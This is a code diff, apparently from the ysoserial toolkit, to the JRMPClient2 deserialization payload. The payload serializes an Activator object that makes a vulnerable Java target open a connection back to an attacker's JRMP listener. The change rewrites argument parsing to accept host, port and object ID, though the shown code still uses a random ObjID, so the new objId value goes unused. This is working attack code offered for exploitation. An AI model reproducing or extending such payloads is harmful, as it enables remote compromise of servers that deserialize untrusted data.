@@ -17,21 +17,31 @@ import sun.rmi.transport.tcp.TCPEndpoint;
     "restriction"
 } )
 @PayloadTest( harness="ysoserial.test.payloads.JRMPReverseConnectSMTest")
-@Authors({ Authors.MBECHLER })
+@Authors({ Authors.MBECHLER,Authors.C0NY1 })
 public class JRMPClient2 extends PayloadRunner implements ObjectPayload<Activator> {
     public JRMPClient2() {
     }
 
     public Activator getObject(String command) throws Exception {
-        int sep = command.indexOf(58);
         String host;
         int port;
-        if (sep < 0) {
-            port = (new Random()).nextInt(65535);
-            host = command;
-        } else {
-            host = command.substring(0, sep);
-            port = Integer.valueOf(command.substring(sep + 1));
+        int objId;
+
+        String[] cmds = command.split("\\:");
+        if(cmds.length == 1){
+            host = cmds[0];
+            port = new Random().nextInt(65535);
+            objId = new Random().nextInt();
+        }else if(cmds.length == 2){
+            host = cmds[0];
+            port = Integer.valueOf(cmds[1]);
+            objId = new Random().nextInt();
+        }else if(cmds.length == 3){
+            host = cmds[0];
+            port = Integer.valueOf(cmds[1]);
+            objId = Integer.valueOf(cmds[2]);
+        }else{
+            throw new Exception("Usage: -a host:port:obj_id");
         }
 
         ObjID objID = new ObjID((new Random()).nextInt());
